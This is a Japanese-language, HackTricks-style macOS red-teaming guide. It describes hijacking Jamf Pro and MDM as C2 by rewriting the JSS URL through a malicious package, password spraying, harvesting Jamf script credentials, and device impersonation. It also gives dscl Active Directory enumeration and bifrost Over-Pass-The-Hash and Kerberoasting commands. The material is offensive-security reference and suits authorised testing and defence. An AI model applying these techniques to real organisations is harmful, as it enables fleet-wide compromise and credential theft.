# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDMsの悪用

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

管理プラットフォームにアクセスするための**admin credentialsをcompromise**できた場合、マシンにmalwareを配布することで、**すべてのコンピューターをpotentially compromise**できます。

MacOS environmentsでred teamingを行うには、MDMの仕組みをある程度理解しておくことが強く推奨されます:


{{#ref}}
macos-mdm/
{{#endref}}

### MDMをC2として使用する

MDMには、profilesのinstall、query、remove、applicationsのinstall、local admin accountsの作成、firmware passwordの設定、FileVault keyの変更などを行う権限があります。

独自のMDMを実行するには、**vendorによって署名されたCSR**が必要です。これは[**https://mdmcert.download/**](https://mdmcert.download/)で取得できる可能性があります。また、Apple devices向けに独自のMDMを実行するには、[**MicroMDM**](https://github.com/micromdm/micromdm)を使用できます。

ただし、enrolled deviceにapplicationをinstallするには、developer accountによる署名が依然として必要です。しかし、MDM enrolment時に**deviceはMDMのSSL certをtrusted CAとして追加する**ため、これで任意のものに署名できるようになります。<sup>[[4]](#references)</sup>

deviceをMDMにenrolするには、rootとして**`mobileconfig`** fileをinstallする必要があります。これは**pkg** file経由で配布できます（zipにcompressしておけば、Safariからdownloadした際にdecompressされます）。

**Mythic agent Orthrus**はこのtechniqueを使用します。

### JAMF PROの悪用

JAMFは、**custom scripts**（sysadminが開発したscripts）、**native payloads**（local accountの作成、EFI passwordの設定、file/process monitoringなど）、および**MDM**（device configurations、device certificatesなど）を実行できます。<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

`https://<company-name>.jamfcloud.com/enroll/`のようなpageにアクセスし、**self-enrolmentがenabled**かどうかを確認します。有効な場合、**access credentialsを要求される**可能性があります。

password spraying attackを実行するには、script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py)を使用できます。

さらに、適切なcredentialsを発見した後、次のformを使用して他のusernamesをbrute-forceできる可能性があります:

![JAMF PROの悪用 - JAMF self-enrolment: さらに、適切なcredentialsを発見した後、次のformを使用して他のusernamesをbrute-forceできる可能性があります](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binaryには、keychainを開くためのsecretが含まれていました。発見当時、このsecretは全員で**shared**されており、値は**`jk23ucnq91jfu9aj`**でした。<sup>[[5]](#references)</sup>\
さらに、jamfは**LaunchDaemon**として**`/Library/LaunchAgents/com.jamf.management.agent.plist`**に**persist**します。

#### JAMF Device Takeover

**`jamf`**が使用する**JSS**（Jamf Software Server）の**URL**は、**`/Library/Preferences/com.jamfsoftware.jamf.plist`**にあります。\
このfileには基本的に次のURLが含まれています:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
そのため、攻撃者は悪意のあるパッケージ（`pkg`）を配置し、インストール時に**このファイルを上書き**して、**Typhon agent**からの Mythic C2 listener の**URLを設定**することで、JAMFをC2として悪用できるようになります。
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

デバイスとJMF間の**通信をimpersonate**するには、以下が必要です:

- デバイスの**UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- `/Library/Application\ Support/Jamf/JAMF.keychain` にある**JAMF keychain**。これにはデバイス証明書が含まれています

この情報を使い、**盗んだ**Hardware **UUID**を設定し、**SIP disabled**の**VMを作成**して、**JAMF keychainを配置**し、Jamf **agentをhook**して情報を盗みます。

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

`/Library/Application Support/Jamf/tmp/` の場所を監視することもできます。管理者がJamf経由で実行しようとする**custom scripts**は、ここに**配置され、実行され、削除される**ためです。これらのスクリプトには**credentialsが含まれている可能性があります**。

ただし、**credentials**がこれらのスクリプトに**parametersとして渡される**場合もあるため、`ps aux | grep -i jamf`を監視する必要があります（rootでなくても可能です）。

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)スクリプトを使うと、新しいファイルの追加や新しいprocess argumentsを監視できます。

### macOS Remote Access

また、**MacOS**の「special」な**network** **protocols**について:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

場合によっては、**MacOS computerがADに接続されている**ことがあります。このシナリオでは、普段行っている方法でActive Directoryを**enumerate**してみるべきです。以下のページに**help**があります:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

役立つ可能性のある**local MacOS tool**として、`dscl`もあります:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
また、MacOS向けに準備された、ADの自動enumerateやkerberosの操作を行うためのツールもあります。

- [**Machound**](https://github.com/XMCyber/MacHound): MacHoundはBloodhound audting toolの拡張機能で、MacOSホスト上のActive Directoryの関係を収集し、取り込むことができます。<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrostは、macOS上のHeimdal krb5 APIsと対話するために設計されたObjective-C projectです。このprojectの目的は、ターゲット上で他のframeworkやpackagesを必要とせず、native APIsを使用してmacOSデバイス上のKerberosに対するsecurity testingをより適切に実行できるようにすることです。
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumerationを行うためのJavaScript for Automation (JXA) toolです。

### ドメイン情報
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

MacOSのユーザーには、次の3種類があります。

- **Local Users** — ローカルのOpenDirectory serviceによって管理され、Active Directoryには一切接続されていません。
- **Network Users** — 認証のためにDC serverへの接続を必要とする、一時的なActive Directoryユーザーです。
- **Mobile Users** — credentialsとfilesのローカルバックアップを持つActive Directoryユーザーです。

ユーザーとgroupsに関するローカル情報は、フォルダー _/var/db/dslocal/nodes/Default._\ に保存されます。\
たとえば、_mark_というユーザーの情報は _/var/db/dslocal/nodes/Default/users/mark.plist_ に保存され、_admin_というgroupの情報は _/var/db/dslocal/nodes/Default/groups/admin.plist_ に保存されます。

HasSessionおよびAdminTo edgesの使用に加えて、**MacHoundはBloodhound databaseに3つの新しいedgesを追加します**:<sup>[[2]](#references)</sup>

- **CanSSH** - hostへのSSHが許可されたエンティティ
- **CanVNC** - hostへのVNCが許可されたエンティティ
- **CanAE** - host上でAppleEvent scriptsを実行することが許可されたエンティティ
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
詳細は [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ パスワード

以下を使用してパスワードを取得します：
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** password は System keychain 内から access できます。

### Over-Pass-The-Hash

特定の user と service 用の TGT を取得します：
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGTを取得したら、以下の方法で現在のセッションにinjectできます。
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
取得した service tickets を使えば、他のコンピューター上の共有へのアクセスを試みることが可能です:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychainへのアクセス

Keychainには、プロンプトを表示させずにアクセスできれば、red team exerciseを進めるのに役立つ可能性が高い機密情報が含まれていることがあります:


{{#ref}}
macos-keychain.md
{{#endref}}

## 外部サービス

MacOS Red Teamingは通常のWindows Red Teamingとは異なります。これは、**MacOSが複数の外部プラットフォームと直接統合されていることが多いためです**。MacOSの一般的な構成では、**OneLoginで同期された認証情報を使用してコンピューターにアクセスし、OneLogin経由で複数の外部サービス**（github、awsなど）にアクセスします。

## その他のRed Teamテクニック

### Safari

Safariでファイルをダウンロードすると、それが「安全な」ファイルの場合、**自動的に開かれます**。たとえば、**zipをダウンロード**すると、自動的に展開されます:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Active Directory Discovery with a Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)


{{#include ../../banners/hacktricks-training.md}}
